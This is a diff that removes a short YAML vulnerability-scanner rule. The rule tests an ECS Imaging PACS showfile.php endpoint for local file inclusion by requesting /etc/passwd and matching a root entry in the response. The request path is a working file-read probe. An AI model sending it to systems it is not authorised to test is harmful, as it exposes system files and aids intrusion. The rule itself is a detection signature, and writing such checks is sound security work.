@@ -1,7 +1,0 @@
-name: poc-yaml-ecsimagingpacs-lfi
-rules:
-  - method: GET
-    path: /showfile.php?file=/etc/passwd
-    follow_redirects: false
-    expression: |
-      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
